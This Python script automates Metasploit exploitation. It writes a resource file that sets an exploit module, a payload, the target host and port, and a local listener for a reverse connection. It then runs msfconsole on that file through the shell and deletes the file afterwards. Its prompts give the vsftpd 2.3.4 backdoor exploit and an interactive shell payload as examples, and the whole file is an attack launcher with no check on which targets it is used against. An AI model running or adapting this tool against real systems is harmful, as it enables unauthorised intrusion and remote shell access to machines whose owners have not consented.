import os
import subprocess
import logging
from logging_setup import setup_logging

# Set up logging
logger = setup_logging()

def generate_resource_file(module, payload, rhost, rport, lhost, lport):
    """
    Create a Metasploit resource file to automate the exploitation process.

    Args:
        module (str): Metasploit exploit module.
        payload (str): Payload to be used.
        rhost (str): Target remote host.
        rport (str): Target remote port.
        lhost (str): Local host for reverse connection.
        lport (str): Local port for reverse connection.

    Returns:
        str: The name of the created resource file.
    """
    resource_file = "exploit.rc"
    with open(resource_file, "w") as file:
        file.write(f"use {module}\n")
        file.write(f"set PAYLOAD {payload}\n")
        file.write(f"set RHOST {rhost}\n")
        file.write(f"set RPORT {rport}\n")
        file.write(f"set LHOST {lhost}\n")
        file.write(f"set LPORT {lport}\n")
        file.write("exploit\n")
    
    logger.info(f"Resource file {resource_file} created.")
    return resource_file

def execute_exploit(module, payload, rhost, rport, lhost, lport):
    """
    Automates the Metasploit exploitation process using the specified module and payload.

    Args:
        module (str): Metasploit exploit module.
        payload (str): Payload to be used.
        rhost (str): Target remote host.
        rport (str): Target remote port.
        lhost (str): Local host for reverse connection.
        lport (str): Local port for reverse connection.

    Returns:
        str: The output of the exploit execution or None if failed.
    """
    resource_file = generate_resource_file(module, payload, rhost, rport, lhost, lport)

    try:
        # Run the resource file with msfconsole
        command = f"msfconsole -r {resource_file} -q"
        logger.info(f"Executing Metasploit exploit: {command}")
        
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            logger.info("Exploit executed successfully.")
            return result.stdout
        else:
            logger.error(f"Exploit execution failed: {result.stderr}")
            return None
    except Exception as e:
        logger.error(f"Error during exploit execution: {str(e)}")
        return None
    finally:
        # Clean up the resource file after execution
        if os.path.exists(resource_file):
            os.remove(resource_file)
            logger.info(f"Resource file {resource_file} deleted.")

if __name__ == "__main__":
    # Gather inputs for the exploit parameters
    module = input("Enter the exploit module (e.g., exploit/unix/ftp/vsftpd_234_backdoor): ")
    payload = input("Enter the payload (e.g., cmd/unix/interact): ")
    rhost = input("Enter the target IP address: ")
    rport = input("Enter the target port (e.g., 21): ")
    lhost = input("Enter your local IP address: ")
    lport = input("Enter your local port (e.g., 4444): ")

    execute_exploit(module, payload, rhost, rport, lhost, lport)
